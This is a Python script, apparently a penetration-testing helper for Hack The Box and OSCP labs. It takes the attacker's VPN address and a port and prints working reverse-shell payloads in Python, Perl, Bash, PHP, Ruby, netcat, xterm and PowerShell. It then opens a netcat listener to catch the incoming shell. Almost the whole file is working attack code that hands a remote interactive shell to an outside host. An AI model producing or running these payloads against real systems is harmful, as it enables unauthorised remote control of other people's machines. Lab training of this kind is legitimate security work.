#!/usr/bin/env python3
# -*- coding:utf-8 -*- 

#pip install colorama

__author__ = "ihebski, @KeyStrOke95 Thanks for Trolls"
__status__ = "Development 2k19"
__tags__ = "Hackthebox & OSCP"
import sys
import os
from colorama import Fore, Back, Style
import subprocess

def start(argv):
    if len(sys.argv) < 2:
        print('Dude, IP or Port???     ¯\_(ツ)_/¯')
        sys.exit()
    else:
        if len(sys.argv) == 3:
            main(argv[0],int(argv[1]))
        else:   
            ip = os.popen("ip a s tun0").read().split("inet ")[1].split("/")[0]
            if len(ip) == 0 :
                print(Fore.RED, "VPN Connection lost!!!")
                sys.exit()
            main(ip,int(argv[0]))

def main(ip,port):
    print("[+] IP Address in use ", ip)

    print(Fore.BLUE, '[+] Python Payload')
    print(Fore.WHITE + f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")

    print(Fore.BLUE, '[+] Perl Payload')
    print(Fore.WHITE + f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'")

    print(Fore.BLUE, '[+] Bash Payload')
    print(Fore.WHITE + f'bash -i >& /dev/tcp/{ip}/{port} 0>&1')

    print(Fore.BLUE, '[+] PHP Payload')
    print(Fore.WHITE + f"php -r '$sock=fsockopen(\"{ip}\",\"{port}\");exec(\"/bin/sh -i <&3 >&3 2>&3\");'")

    print(Fore.BLUE, '[+] Ruby Payload')
    print(Fore.WHITE + f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")

    print(Fore.BLUE, '[+] Netcat Payload')
    print(Fore.RED, 'Payload 01 => ', Fore.WHITE + '\n' + f'nc -e /bin/sh {ip} {port}')
    print(Fore.RED, 'Payload 02 => ', Fore.WHITE + '\n' + f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f')

#    print(Fore.BLUE, '[+] Java Payload')
#    print(Fore.WHITE, f"r = Runtime.getRuntime()p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip!s}/{port!s};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])p.waitFor()")
        
    print(Fore.BLUE, '[+] xTerm Payload')
    print(Fore.WHITE, f'xterm -display {ip}:1')
    
    print(Fore.BLUE, '[+] Powershell Payload')
    print(Fore.WHITE + f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port})' + ';$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()')

    print(Fore.GREEN, '\n[+] Incoming shell *-*', end='')
    if port > 1023:
        cmd = f'nc -lnvp {port}'
        print('\033[39m')
    else:
        cmd = f'sudo nc -lnvp {port}'
        print(Fore.RED, 'with sudo', '\033[39m')
    subprocess.call([cmd], shell=True)

if __name__ == '__main__':
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt as err:
        print("\n[!] :)")
        sys.exit(0)
